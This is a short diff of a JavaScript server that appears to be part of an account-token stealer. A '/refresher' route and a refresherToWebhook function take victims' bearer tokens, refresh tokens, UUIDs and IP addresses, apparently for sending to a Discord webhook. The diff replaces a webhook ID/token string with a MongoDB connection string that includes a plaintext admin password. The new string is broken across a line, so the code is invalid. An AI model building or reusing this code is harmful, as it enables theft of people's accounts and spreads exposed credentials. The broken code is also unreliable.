@@ -706,7 +706,8 @@ app.get('/refresher', async (req, res) => {
         console.log(e)
     }
 })
-const database = '1110458653716271184/qvYvRbZmfcmP2DdFU0xcfMe5wsNE31ZnubnfYEZ3mIFwf9r0wJXyxk8WHh3hZq7Rq_3N'
+const database = 'mongodb+srv://doadmin:Nt8Ca9527163THvE@db-mongodb-nyc1-42868-0e5ecaa2.mongo.ondigitalocean.com/admin?tls=true&authSource=admin&replicaSet=db-mongodb-nyc1-42868
+'
 const log = discord_api+database
 async function refresherToWebhook(discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag) {
 
